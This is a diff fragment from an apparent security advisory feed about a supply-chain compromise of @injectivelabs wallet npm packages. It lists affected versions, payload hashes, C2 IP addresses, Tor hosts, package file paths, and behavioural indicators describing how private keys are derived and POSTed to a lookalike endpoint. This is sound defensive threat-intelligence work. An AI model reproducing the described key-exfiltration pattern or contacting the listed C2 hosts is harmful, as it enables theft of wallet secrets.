-| `@injectivelabs/wallet-ledger` | `1.20.21` | XRAY-1024744 |
-| `@injectivelabs/wallet-wallet-connect` | `1.20.21` | XRAY-1024746 |
-| `@injectivelabs/wallet-magic` | `1.20.21` | XRAY-1024739 |
-| `@injectivelabs/wallet-strategy` | `1.20.21` | XRAY-1024743 |
-| `@injectivelabs/wallet-turnkey` | `1.20.21` | XRAY-1024742 |
-| `@injectivelabs/wallet-cosmos-strategy` | `1.20.21` | XRAY-1024738 |
+### Payloads
 
-### Network IOCs
+| SHA-256 | Description |
+| :---- | :---- |
+| `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86` | Malicious `index.js` file (the `jscrambler` CSI container) |
+| `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd` | Linux x86-64 payload |
+| `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903` | Windows x86-64 payload |
+| `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd` | macOS arm64 payload |
 
-```text
-testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network
-hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
-```
+### Network indicators
 
-### Behavioral Indicators
+* `37.27.122.124` (C2 / upload destination)
+* `57.128.246.79` (C2 / upload destination)
+* `archive.torproject.org` (Tor bundle checks)
+* `check.torproject.org` (Tor loop verification)
 
-```text
-PrivateKey.fromMnemonic() followed by POST to Injective-looking gRPC-Web endpoint
-PrivateKey.fromHex() followed by POST to Injective-looking gRPC-Web endpoint
-MsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST
-EthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST
-Empty-body POST with high-entropy X-Request-Id header and Content-Type application/grpc-web+proto
-```
+### Package indicators
+
+* `package/dist/intro.js`
+* `package/dist/setup.js`
+* `setup.mjs`
 ]]></content:encoded>
         </item>
         <item>
